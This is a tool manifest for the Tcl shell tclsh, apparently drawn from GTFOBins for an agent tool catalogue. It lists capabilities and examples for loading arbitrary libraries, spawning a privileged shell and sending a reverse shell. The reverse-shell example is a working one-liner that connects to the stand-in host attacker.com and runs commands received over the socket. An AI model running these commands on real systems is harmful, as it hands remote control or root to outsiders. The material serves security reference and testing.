---
id: dev-tcl-tclsh
namespace: dev:tcl:tclsh
name: tclsh
description: Tcl scripting language shell; can execute code, read/write files, and
  spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- system.library.load
- security.execution.reverse-shell
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- tclsh
parameters: []
features:
- file-system
- interactive
- local
- pipes-stdin
- process-manip
- requires-root
execution:
  template: tclsh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Load arbitrary libraries (sudo, suid, unprivileged)
  command: 'tclsh

    load /path/to/lib.so x'
- description: Send a reverse shell (sudo, suid, unprivileged)
  command: 'tclsh

    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets
    $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush
    $s; }; close $s;'
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: tclsh
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/tclsh/
techniques:
- execution
- command-and-control
- privilege-escalation
install:
- method: apt
  package_name: tcl
  commands:
  - apt-get install -y tcl
---

# tclsh

tclsh is a command-line utility. Tcl scripting language shell; can also load arbitrary libraries, send a reverse shell, spawn an interactive shell.
